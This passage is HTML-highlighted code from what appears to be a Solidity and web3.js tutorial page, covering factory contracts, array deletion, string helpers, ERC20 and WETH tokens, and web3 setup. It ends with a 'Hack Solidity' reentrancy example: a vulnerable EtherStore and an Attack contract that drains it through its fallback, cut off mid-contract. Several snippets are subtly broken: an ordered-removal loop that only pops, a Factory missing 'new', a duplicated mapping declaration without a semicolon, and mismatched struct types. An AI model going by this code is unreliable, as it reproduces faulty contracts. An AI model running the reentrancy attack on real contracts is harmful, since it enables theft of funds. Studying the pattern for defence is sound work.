<span class=\"token function\">A</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span>x<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">foo</span><span class=\"token punctuation\">(</span>arg1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">B</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span>x<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">bar</span><span class=\"token punctuation\">(</span>arg2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">A</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">foo</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> arg<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//code here</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">B</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">bar</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> arg<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">//code here</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h4>Manage a collection of smart contracts</h4>\n<p>Manage a collection of smart contracts using factory(the child pattern</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.6</span><span class=\"token number\">.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Factory</span> <span class=\"token punctuation\">{</span>\n    Child<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> children<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">ChildCreated</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">uint</span> date<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint</span> data<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> childAddress\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">createChild</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _data<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        Child child <span class=\"token operator\">=</span> <span class=\"token function\">Child</span><span class=\"token punctuation\">(</span>_data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        children<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>child<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">ChildCreated</span><span class=\"token punctuation\">(</span>now<span class=\"token punctuation\">,</span> _data<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>child<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Child</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">uint</span> data<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _data<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        data <span class=\"token operator\">=</span> _data<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>How to delete an element in array</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.6</span><span class=\"token number\">.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">string</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> data<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        data<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Davis\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        data<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Steve\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        data<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Dan\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        data<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Stacy\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        data<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Marion\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">removeWithNoOrder</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> index<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        data<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span>data<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        data<span class=\"token punctuation\">.</span><span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">removeWithOrder</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> index<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> i <span class=\"token operator\">=</span> index<span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> data<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            data<span class=\"token punctuation\">.</span><span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h4>Representing collection of data</h4>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.6</span><span class=\"token number\">.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Collections</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">User</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">uint</span> id<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">string</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    User<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> users<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> <span class=\"token operator\">=></span> User<span class=\"token punctuation\">)</span> users\n    <span class=\"token builtin\">uint</span> nextUserId<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h4>Return an array</h4>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.6</span><span class=\"token number\">.0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">pragma</span> experimental ABIEncoderV2<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Collections</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">User</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">uint</span> userAddress<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">string</span> balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    User<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> users<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">getUsers</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span>User<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> users<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h4>String manipulation</h4>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">  <span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span> <span class=\"token number\">0.6</span><span class=\"token number\">.0</span><span class=\"token punctuation\">;</span>\n \n \n <span class=\"token keyword\">contract</span> <span class=\"token class-name\">MyContract</span> <span class=\"token punctuation\">{</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">calldata</span> str<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n         <span class=\"token keyword\">return</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">}</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">concatenate</span><span class=\"token punctuation\">(</span>\n         <span class=\"token builtin\">string</span> <span class=\"token keyword\">calldata</span> a<span class=\"token punctuation\">,</span>\n         <span class=\"token builtin\">string</span> <span class=\"token keyword\">calldata</span> b\n         <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n             <span class=\"token keyword\">return</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">}</span>\n         \n     <span class=\"token keyword\">function</span> <span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">calldata</span> _str<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n         <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> str <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>_str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> tmp <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">string</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> _reverse <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         \n         <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> str<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n             _reverse<span class=\"token punctuation\">[</span>str<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> i <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> str<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">}</span>\n         <span class=\"token keyword\">return</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">(</span>_reverse<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">}</span>\n     \n     <span class=\"token keyword\">function</span> <span class=\"token function\">compare</span><span class=\"token punctuation\">(</span>\n         <span class=\"token builtin\">string</span> <span class=\"token keyword\">calldata</span> a<span class=\"token punctuation\">,</span>\n         <span class=\"token builtin\">string</span> <span class=\"token keyword\">calldata</span> b\n         <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n             <span class=\"token keyword\">return</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">}</span>\n <span class=\"token punctuation\">}</span></code></pre></div>\n<h4>Create a ERC20 token faucet</h4>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">>=</span><span class=\"token version number\">0.6.0</span> <span class=\"token operator\">&lt;</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/token/ERC20/ERC20.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">MyToken</span> <span class=\"token keyword\">is</span> ERC20 <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> name<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> symbol<span class=\"token punctuation\">)</span>\n        <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> symbol<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n            \n        <span class=\"token punctuation\">}</span>\n        \n        <span class=\"token keyword\">function</span> <span class=\"token function\">mint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> recipient<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>recipient<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h4>Create a wrapped ether token</h4>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">WETH</span> <span class=\"token keyword\">is</span> ERC20 <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Wrapped Ether\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"WETH\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">mint</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> burn <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_burn</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3>Web3</h3>\n<div class=\"gatsby-highlight\" data-language=\"js\"><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> Web3 <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'web3'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> customProvider <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function-variable function\">sendAsync</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">payload<span class=\"token punctuation\">,</span> cb</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span><span class=\"token punctuation\">{</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"you called\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">cb</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">undefined</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// const provider = new Web3.providers.HttpProvider('http://localhost:8545')</span>\n<span class=\"token keyword\">const</span> web3 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Web3</span><span class=\"token punctuation\">(</span><span class=\"token string\">'http://localhost:8545'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">// const web3 = new Web3(customProvider);</span>\n\nweb3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span><span class=\"token function\">getBlockNumber</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span> console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"done\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h3>deployed contract and web3</h3>\n<div class=\"gatsby-highlight\" data-language=\"js\"><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> Web3 <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'web3'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> MyContract <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./build/contracts/MyContract.json'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> id <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span><span class=\"token function\">getId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> deployedNetwork <span class=\"token operator\">=</span> MyContract<span class=\"token punctuation\">.</span>networks<span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> web3 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Web3</span><span class=\"token punctuation\">(</span><span class=\"token string\">'http://localhost:8545'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">const</span> contract <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>contract</span><span class=\"token punctuation\">(</span>\n    MyContract<span class=\"token punctuation\">.</span>abi<span class=\"token punctuation\">,</span>\n    deployedNetwork<span class=\"token punctuation\">.</span>address\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2>Hack Solidity</h2>\n<h3>Reentrancy Hack</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.10</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/*\n-What is reentrancy\n*/</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">EtherStore</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balances<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> sent<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> _amount<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sent<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Failed to send Ether\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> _amount<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span> <span class=\"token punctuation\">{</span>\n    EtherStore <span class=\"token keyword\">public</span> etherStore<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _etherStoreAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        etherStore <span class=\"token operator\">=</span> <span class=\"token function\">EtherStore</span><span class=\"token punctuation\">(</span>_etherStoreAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>etherStore<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">>=</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            etherStore<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token 